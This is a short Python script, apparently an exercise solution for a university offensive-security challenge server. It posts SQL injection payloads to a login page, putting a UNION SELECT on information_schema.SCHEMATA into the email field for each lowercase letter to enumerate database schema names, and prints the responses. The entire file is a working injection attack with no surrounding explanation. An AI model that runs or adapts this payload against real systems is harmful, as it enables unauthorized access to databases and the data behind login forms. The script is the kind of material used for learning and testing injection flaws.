import requests
from string import ascii_lowercase

print("Sending Requests")

cookies = {'CHALBROKER_USER_ID': 'bh1642'}

url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:1241/login.php"
for c in ascii_lowercase:
    params = {'email': "' UNION SELECT SCHEMA_NAME, 2, 3  FROM information_schema.SCHEMATA WHERE SCHEMA_NAME LIKE '" + c + "%' -- ", 'password': 'tsts'}
    r = requests.post(url, data=params, cookies=cookies)
    print(r)
    print(r.text)

#print(r.text)
